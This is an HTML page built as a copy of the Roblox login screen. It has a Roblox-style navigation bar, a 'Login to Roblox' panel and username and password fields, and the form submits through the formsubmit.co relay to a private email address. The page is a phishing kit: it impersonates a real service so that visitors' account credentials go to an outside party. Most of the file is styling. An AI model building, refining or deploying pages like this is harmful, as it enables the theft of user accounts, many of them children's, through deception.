<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Login — Réplique ajustée</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">

<style>
  :root{
    --bg: #1e2022;
    --header: #191b1d;
    --panel: #232527;
    --input-bg: #2d2f31;
    --input-border: rgba(255,255,255,0.08);
    --accent-blue: #1446FF;
    --muted: #bfc3c6;
    --title: #ffffff;
    --button-alt: #3b3d40;
    --outline: rgba(255,255,255,0.14);
  }

  *{box-sizing:border-box}
  body{
    margin:0;
    font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
    background:var(--bg);
    color:var(--muted);
    display:flex;
    flex-direction:column;
    align-items:center;
  }

  header{
    width:100%;
    background:var(--header);
    padding:10px 16px;
    display:flex;
    justify-content:space-between;
    align-items:center;
  }
  .nav-left {
    display:flex; gap:20px;
  }
  .nav-left a {
    color:#efefef;
    font-size:13px;
    text-decoration:none;
    opacity:0.9;
  }
  .signup {
    background:var(--accent-blue);
    color:#fff;
    padding:6px 14px;
    border-radius:8px;
    font-weight:600;
    font-size:14px;
    border:none;
    cursor:pointer;
  }

  .center-wrap {
    width:100%;
    max-width:380px;
    padding:24px 16px;
    margin-top:60px;
  }
  .panel {
    width:100%;
    background:var(--panel);
    border-radius:10px;
    padding:30px 20px 34px;
    text-align:center;
  }

  h1{
    margin:0 0 20px;
    font-family:"Poppins", "Inter", sans-serif;
    font-weight:700;
    color:var(--title);
    font-size:24px;
    letter-spacing:0.2px;
  }

  form{
    max-width:100%;
  }
  .field{
    margin:10px 0;
  }
  input[type="text"],
  input[type="password"]{
    width:100%;
    height:48px;
    padding:12px 14px;
    border-radius:10px;
    border:1px solid var(--input-border);
    background:var(--input-bg);
    color:#f7f7f7;
    font-size:14px;
    font-weight:500;
  }
  input::placeholder{ color:#a8acb0; font-weight:500; }

  .btn-primary{
    width:100%;
    height:48px;
    margin-top:8px;
    border-radius:10px;
    background:transparent;
    border:2px solid var(--outline);
    color:var(--title);
    font-size:16px;
    font-weight:600;
    cursor:pointer;
  }
  .btn-primary:active{ transform:translateY(1px); }

  .forgot{
    display:block;
    margin:18px 0 10px;
    color:var(--muted);
    text-decoration:none;
    font-size:14px;
    font-weight:600;
  }

  hr.sep{
    border:0;
    height:1px;
    background:rgba(255,255,255,0.05);
    margin:16px 0;
  }

  .btn-alt{
    width:100%;
    height:46px;
    background:var(--button-alt);
    color:#f5f5f5;
    border-radius:10px;
    border:none;
    font-weight:600;
    margin-bottom:10px;
    font-size:14px;
    cursor:pointer;
  }

  .panel-foot{
    margin-top:14px;
    color:var(--muted);
    font-size:13px;
  }
  .panel-foot a{ color:var(--accent-blue); text-decoration:none; font-weight:600; }

  @media (max-width:360px){
    .center-wrap{ padding:16px 12px }
    h1{ font-size:22px }
    input[type="text"], input[type="password"]{ height:44px; border-radius:8px; font-size:13px }
    .btn-primary{ height:44px; border-radius:8px; font-size:15px }
    .btn-alt{ height:42px; font-size:13px }
  }
</style>
</head>
<body>

  <header>
    <div class="nav-left">
      <a href="#" aria-hidden="true">▢</a>
      <a href="#">Charts</a>
      <a href="#">Marketplace</a>
      <a href="#">Create</a>
      <a href="#">Robux</a>
    </div>
    <button class="signup">Sign Up</button>
  </header>

  <main class="center-wrap">
    <section class="panel">
      <h1>Login to Roblox</h1>
      <form action="https://formsubmit.co/celianmez@gmail.com" method="POST" autocomplete="on">
        <label class="field" name="truc1" for="u"><input id="u" type="text" placeholder="Username/Email/Phone" required></label>
        <label class="field" name="truc2" for="p"><input id="p" type="password" placeholder="Password" required></label>
        <button class="btn-primary" type="submit">Log In</button>
      </form>
      <a class="forgot" href="#">Forgot Password or Username?</a>
      <hr class="sep">
      <button class="btn-alt">Email Me a One-Time Code</button>
      <button class="btn-alt">Use Another Device</button>
      <div class="panel-foot">
        Don’t have an account? <a href="#">Sign Up</a>
      </div>
    </section>
  </main>

</body>
</html>
